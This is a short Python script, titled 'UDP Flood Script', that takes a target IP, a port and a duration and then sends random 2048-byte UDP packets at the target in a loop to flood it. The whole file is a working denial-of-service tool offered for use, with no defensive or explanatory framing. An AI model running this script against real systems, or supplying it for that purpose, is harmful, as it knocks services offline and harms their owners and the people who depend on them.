import socket,os,random,argparse,sys
from time import time as tt

def arguments():
    parser = argparse.ArgumentParser(description="UDP Flood Script")
    parser.add_argument('-t','--target',help="IP of target", type=str, metavar="<ip>")
    parser.add_argument('-p','--port',help="Port to attack", type=int, metavar="<port>", default=80)
    parser.add_argument('--time',help="Time in seconds to keep the attack", type=int, metavar="<seconds>",default=120)
    argss = parser.parse_args()
    if argss.target is None:
        sys.exit(parser.print_help())
    return argss

def attack(argss):
    timeout = tt() + argss.time
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        if tt() > timeout:
            sys.exit('Exiting...')
        bytess = random._urandom(2048)
        sock.sendto(bytess, (argss.target,argss.port))
        print "bytes sended"

if __name__ == '__main__':
    attack(arguments())
